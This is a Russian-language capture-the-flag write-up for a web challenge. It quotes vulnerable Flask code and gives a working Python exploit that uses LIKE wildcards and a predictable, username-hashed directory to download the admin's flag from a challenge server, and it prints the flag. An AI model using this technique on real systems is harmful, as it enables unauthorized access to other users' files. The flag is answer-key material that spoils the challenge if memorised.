## Описание

Цифровые тени скользят по серым стенам этого необычного хранилища данных. Полупрозрачные стражи лениво кружат между файлами, охраняя чужие секреты. Но так ли надежно спрятано то, что кажется невидимым для обычных глаз? В конце концов, даже у призраков есть свои уязвимые места. 

## Решение

В коде замечаем, что путь к директории - это hash от имени пользователя и файл получается в SQL скрипте через LIKE -> можно через ссылку формата '{директория админа}/flag%.txt' вытащить флаг :

```
directory_hash = hashlib.sha256(username.encode()).hexdigest()
flag_filename = f"flag_{random_suffix}.txt"

@app.route('/download/<path:filepath>')
def download_file(filepath):
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    try:
        directory, filename = filepath.split('/')

if target_user:
    c.execute("""
        SELECT f.stored_filename 
        FROM files f 
        JOIN users u ON f.user_id = u.id 
        WHERE u.username = ? AND f.stored_filename LIKE ?
    """, (target_user, f"%{filename}%"))
    
    file = c.fetchone()
    conn.close()
    
    if file:
        return send_file(os.path.join(UPLOAD_FOLDER, directory, file[0]))
```

Регистрируемся user user, получаем флаг через код:

```
import requests
import hashlib


def simple_exploit():
    base_url = "http://62.173.140.174:16066/"

    # Регистрируемся и логинимся
    s = requests.Session()
    username = "user"
    password = "user"

    s.post(f"{base_url}/login", data={'username': username, 'password': password})

    # Получаем хеш директории admin
    admin_dir = hashlib.sha256(b'admin').hexdigest()
    print(f"Admin directory: {admin_dir}")

    # Используем уязвимость LIKE в SQL запросе
    # Файл флага имеет формат: flag_{12_random_chars}.txt
    flag_path = f"{admin_dir}/flag_%.txt"

    response = s.get(f"{base_url}/download/{flag_path}")

    if response.status_code == 200:
        print("Flag found!")
        print(response.text)
    else:
        print(f"Failed: {response.status_code}")


simple_exploit()
```

CODEBY{GH0ST_1N_7H3_CL0UD_D3F3473D}
